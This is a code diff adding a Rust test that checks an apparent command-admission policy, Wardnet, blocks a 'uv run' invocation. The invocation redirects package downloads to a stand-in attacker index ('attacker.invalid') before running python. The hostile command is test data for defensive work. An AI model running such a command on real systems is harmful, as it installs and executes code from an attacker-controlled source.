@@ -79,6 +79,41 @@ fn uv_global_trust_authority_before_run_remains_visible() {
 }
 
 #[test]
+fn uv_run_owned_trust_authority_before_child_remains_visible() {
+    let (policy, mut intent) = approved_uv_install();
+    intent.argv = vec![
+        "uv".to_string(),
+        "run".to_string(),
+        "--index-url".to_string(),
+        "https://attacker.invalid/simple".to_string(),
+        "python".to_string(),
+    ];
+
+    let decision = admission_decision(&policy, &intent);
+
+    assert_eq!(decision.decision, DecisionKind::Block);
+    assert!(
+        decision
+            .reason_codes
+            .contains(&ReasonCode::ForbiddenCommand),
+        "unsupported uv run must remain fail-closed: {:?}",
+        decision.reason_codes
+    );
+    assert!(
+        decision
+            .reason_codes
+            .contains(&ReasonCode::AlternateTrustRoot),
+        "uv run options before the child command are consumed by uv and must remain Wardnet trust-root evidence: {:?}",
+        decision.reason_codes
+    );
+    assert_eq!(
+        decision.command_sha256,
+        sha256_hex(intent.argv.join("\u{1f}").as_bytes()),
+        "audit identity must remain bound to the exact submitted argv"
+    );
+}
+
+#[test]
 fn uv_global_option_values_named_like_commands_do_not_shift_trust_phase() {
     let (policy, mut intent) = approved_uv_install();
 
